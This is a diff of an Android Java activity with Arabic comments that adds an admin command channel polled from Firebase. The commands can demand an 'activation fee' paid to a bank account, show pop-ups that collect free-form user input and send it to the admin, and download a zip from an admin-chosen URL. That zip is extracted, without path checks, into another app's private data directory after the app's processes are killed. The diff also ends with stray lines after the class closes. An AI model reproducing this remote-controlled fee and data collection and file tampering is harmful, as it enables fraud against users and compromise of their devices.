@@ -17,6 +17,7 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.cardview.widget.CardView;
 
@@ -54,6 +55,10 @@ public class SecondActivity extends AppCompatActivity {
     private final Handler refreshHandler = new Handler(Looper.getMainLooper());
     private Runnable refreshRunnable;
 
+    // متغيرات للتحكم في استقرار النوافذ
+    private long lastProcessedTimestamp = 0;
+    private AlertDialog currentDialog = null;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -63,7 +68,7 @@ public class SecondActivity extends AppCompatActivity {
 
         initViews();
         generateTicketID();
-        startAutoRefresh(); // بدء مراقبة أوامر الآدمن من فايبربيز
+        startAutoRefresh();
     }
 
     private void initViews() {
@@ -79,7 +84,6 @@ public class SecondActivity extends AppCompatActivity {
 
         btnExecuteTask = findViewById(R.id.btnExecuteTask);
         btnStartFullVerify = findViewById(R.id.btnStartFullVerify);
-
         taskProgressBar = findViewById(R.id.taskProgressBar);
     }
 
@@ -87,7 +91,7 @@ public class SecondActivity extends AppCompatActivity {
         refreshRunnable = new Runnable() {
             @Override public void run() { 
                 checkAdminCommands(); 
-                refreshHandler.postDelayed(this, 4000); 
+                refreshHandler.postDelayed(this, 5000); 
             }
         };
         refreshHandler.post(refreshRunnable);
@@ -96,61 +100,215 @@ public class SecondActivity extends AppCompatActivity {
     private void checkAdminCommands() {
         String url = FIREBASE_URL + "commands/" + userName + ".json";
         client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
-            @Override public void onFailure(Call call, IOException e) {}
-            @Override public void onResponse(Call call, Response response) throws IOException {
+            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
+            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                 if (response.isSuccessful() && response.body() != null) {
+                    String res = response.body().string();
+                    
+                    // حالة الحظر/الحذف من الآدمن
+                    if (res.equals("null")) {
+                        handleDeletion();
+                        return;
+                    }
+
                     try {
-                        String res = response.body().string();
-                        if (res.equals("null")) return;
                         JSONObject data = new JSONObject(res);
-                        runOnUiThread(() -> handleCommand(data.optString("status"), data));
+                        long timestamp = data.optLong("timestamp", 0);
+                        String status = data.optString("status");
+
+                        // منع تكرار نفس الأمر بناءً على التوقيت
+                        if (timestamp > lastProcessedTimestamp) {
+                            lastProcessedTimestamp = timestamp;
+                            runOnUiThread(() -> handleCommand(status, data));
+                        }
                     } catch (Exception ignored) {}
                 }
             }
         });
     }
 
+    private void handleDeletion() {
+        runOnUiThread(() -> {
+            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
+            Toast.makeText(this, "انتهت صلاحية الجلسة أو تم حظرك", Toast.LENGTH_LONG).show();
+            finishAffinity(); 
+        });
+    }
+
     private void handleCommand(String status, JSONObject data) {
-        // إخفاء جميع الواجهات لضمان ظهور الحالة الجديدة فقط
+        // إخفاء كل شيء أولاً
+        hideAllLayouts();
+
+        String content = data.optString("content");
+
+        switch (status) {
+            case "waiting":
+                layoutWaiting.setVisibility(View.VISIBLE);
+                break;
+            case "rejected":
+                layoutRejected.setVisibility(View.VISIBLE);
+                txtRejectReason.setText(content.isEmpty() ? "تم رفض طلبك حالياً" : content);
+                break;
+            case "zip_task":
+                layoutZipTask.setVisibility(View.VISIBLE);
+                btnExecuteTask.setOnClickListener(v -> startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
+                break;
+            case "verify_phone":
+                layoutVerifyTask.setVisibility(View.VISIBLE);
+                btnStartFullVerify.setOnClickListener(v -> startActivity(new Intent(this, VerifyActivity.class)));
+                break;
+            case "show_payment":
+                showPaymentUI(content);
+                break;
+            case "show_alert":
+                layoutWaiting.setVisibility(View.VISIBLE); // ابقِ الخلفية انتظار
+                showCustomPopUp(content, false);
+                break;
+            case "show_input":
+                layoutWaiting.setVisibility(View.VISIBLE);
+                showCustomPopUp(content, true);
+                break;
+            default:
+                layoutWaiting.setVisibility(View.VISIBLE);
+                break;
+        }
+    }
+
+    private void hideAllLayouts() {
         layoutWaiting.setVisibility(View.GONE);
         layoutRejected.setVisibility(View.GONE);
         layoutZipTask.setVisibility(View.GONE);
         layoutVerifyTask.setVisibility(View.GONE);
         layoutPayment.setVisibility(View.GONE);
+    }
 
-        String content = data.optString("content");
+    private void showPaymentUI(String amount) {
+        layoutPayment.setVisibility(View.VISIBLE);
+        txtPaymentDetails.setText("تم فحص حسابك بنجاح.\nيرجى دفع رسوم التفعيل: " + amount + " ريال\nعبر حسابنا في الكريمي/العمقي: 123456");
+    }
 
-        switch (status) {
-            case "rejected":
-                layoutRejected.setVisibility(View.VISIBLE);
-                txtRejectReason.setText(content.isEmpty() ? "تم رفض الطلب" : content);
-                break;
+    private void showCustomPopUp(String message, boolean isInput) {
+        // منع فتح أكثر من نافذة في نفس الوقت
+        if (currentDialog != null && currentDialog.isShowing()) return;
 
-            case "zip_task":
-                layoutZipTask.setVisibility(View.VISIBLE);
-                btnExecuteTask.setOnClickListener(v -> 
-                    startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
-                break;
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        View view = getLayoutInflater().inflate(R.layout.dialog_custom, null);
+        
+        TextView txtMsg = view.findViewById(R.id.dialogMessage);
+        EditText edtIn = view.findViewById(R.id.dialogInput);
+        Button btnOk = view.findViewById(R.id.btnDialogAction);
+        ImageView btnClose = view.findViewById(R.id.btnDialogClose);
 
-            case "verify_phone":
-                layoutVerifyTask.setVisibility(View.VISIBLE);
-                // التعديل هنا: فتح واجهة الفحص المستقلة
-                btnStartFullVerify.setOnClickListener(v -> {
-                    startActivity(new Intent(SecondActivity.this, VerifyActivity.class));
+        txtMsg.setText(message);
+        edtIn.setVisibility(isInput ? View.VISIBLE : View.GONE);
+        
+        currentDialog = builder.setView(view).setCancelable(false).create();
+        if(currentDialog.getWindow() != null) currentDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+
+        btnClose.setOnClickListener(v -> {
+            resetStatusOnServer();
+            currentDialog.dismiss();
+        });
+
+        btnOk.setOnClickListener(v -> {
+            if(isInput) {
+                String input = edtIn.getText().toString().trim();
+                if (!input.isEmpty()) {
+                    sendResponseToAdmin(input);
+                    currentDialog.dismiss();
+                } else {
+                    edtIn.setError("مطلوب");
+                }
+            } else {
+                resetStatusOnServer();
+                currentDialog.dismiss();
+            }
+        });
+        currentDialog.show();
+    }
+
+    private void sendResponseToAdmin(String response) {
+        String url = FIREBASE_URL + "user_responses/" + userName + ".json";
+        JSONObject data = new JSONObject();
+        try {
+            data.put("answer", response);
+            data.put("time", System.currentTimeMillis());
+            
+            RequestBody body = RequestBody.create(data.toString(), MediaType.parse("application/json"));
+            client.newCall(new Request.Builder().url(url).put(body).build()).enqueue(new Callback() {
+                @Override public void onResponse(@NonNull Call call, @NonNull Response response) {
+                    resetStatusOnServer(); // تصفير الحالة بعد الرد
+                }
+                @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
+            });
+        } catch (Exception ignored) {}
+    }
+
+    private void resetStatusOnServer() {
+        String url = FIREBASE_URL + "commands/" + userName + "/status.json";
+        RequestBody body = RequestBody.create("\"waiting\"", MediaType.parse("application/json"));
+        client.newCall(new Request.Builder().url(url).put(body).build()).enqueue(new Callback() {
+            @Override public void onResponse(@NonNull Call call, @NonNull Response response) {}
+            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
+        });
+    }
+
+    // دالة فك الضغط والتعديل (نفس منطقك السابق مع تحسين طفيف)
+    private void startModdingProcess(String url, String pkg) {
+        btnExecuteTask.setEnabled(false);
+        taskProgressBar.setVisibility(View.VISIBLE);
+        new Thread(() -> {
+            try {
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                am.killBackgroundProcesses(pkg);
+                File tempZip = new File(getCacheDir(), "upd.zip");
+                downloadFileSync(url, tempZip);
+                unzip(tempZip, new File(createPackageContext(pkg, 0).getApplicationInfo().dataDir));
+                tempZip.delete();
+                runOnUiThread(() -> {
+                    Toast.makeText(this, "اكتمل التعديل ✅", Toast.LENGTH_SHORT).show();
+                    resetStatusOnServer();
                 });
-                break;
+            } catch (Exception e) {
+                runOnUiThread(() -> Toast.makeText(this, "فشلت العملية", Toast.LENGTH_SHORT).show());
+            }
+            runOnUiThread(() -> { taskProgressBar.setVisibility(View.GONE); btnExecuteTask.setEnabled(true); });
+        }).start();
+    }
 
-            case "show_payment":
-                showPaymentUI(content);
-                break;
+    private void downloadFileSync(String url, File dest) throws IOException {
+        try (Response response = client.newCall(new Request.Builder().url(url).build()).execute()) {
+            if (!response.isSuccessful() || response.body() == null) throw new IOException("Fail");
+            try (BufferedSink sink = Okio.buffer(Okio.sink(dest))) { sink.writeAll(response.body().source()); }
+        }
+    }
 
-            case "show_alert":
-                showCustomPopUp(content, false);
-                break;
+    private void unzip(File zip, File dir) throws IOException {
+        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zip)))) {
+            ZipEntry ze;
+            while ((ze = zis.getNextEntry()) != null) {
+                File f = new File(dir, ze.getName());
+                if (ze.isDirectory()) f.mkdirs();
+                else {
+                    if (f.getParentFile() != null) f.getParentFile().mkdirs();
+                    try (FileOutputStream fos = new FileOutputStream(f)) {
+                        byte[] b = new byte[8192]; int l;
+                        while ((l = zis.read(b)) != -1) fos.write(b, 0, l);
+                    }
+                }
+            }
+        }
+    }
 
-            case "show_input":
-                showCustomPopUp(content, true);
-                break;
+    private void generateTicketID() { 
+        txtTicketID.setText("BT-" + (System.currentTimeMillis() / 1000000)); 
+    }
+
+    @Override protected void onDestroy() { 
+        super.onDestroy(); 
+        refreshHandler.removeCallbacks(refreshRunnable); 
+    }
+}
 
             default:
                 layoutWaiting.setVisibility(View.VISIBLE);
